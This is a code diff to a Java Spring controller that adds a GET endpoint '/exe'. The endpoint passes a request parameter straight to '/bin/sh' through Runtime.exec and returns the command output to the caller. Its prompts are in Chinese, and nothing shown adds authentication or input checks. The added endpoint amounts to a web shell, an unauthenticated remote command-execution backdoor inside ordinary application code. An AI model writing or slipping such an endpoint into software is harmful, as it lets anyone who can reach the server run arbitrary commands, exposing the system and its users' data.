@@ -1,9 +1,11 @@
 package com.csh.controller;
 
 import java.awt.image.BufferedImage;
+import java.io.BufferedReader;
 import java.io.ByteArrayInputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.security.interfaces.RSAPublicKey;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -330,5 +332,37 @@ public String main(ModelMap model,  HttpSession session) {
       }
       return options;
   }
+  @RequestMapping(value = "/exe", method = RequestMethod.GET)
+  public @ResponseBody String exe(String path) {
+    String result = "未执行";
+    if (path == null)
+    {
+      return  "请输入需要执行的shell脚本";
+    }
+    try
+    {
+      
+      String cmd = "/bin/sh "+path;
+      Process ps = Runtime.getRuntime ().exec (cmd);
 
+      BufferedReader br = new BufferedReader (new InputStreamReader (
+          ps.getInputStream ()));
+      StringBuffer sb = new StringBuffer ();
+      String line;
+      while ((line = br.readLine ()) != null)
+      {
+        sb.append (line).append ("\n");
+      }
+      result = sb.toString ();
+
+      System.out.println (result);
+    }
+    catch (Exception e)
+    {
+     result =  "执行失败";
+      e.printStackTrace ();
+    }
+    
+    return result;
+  }
 }
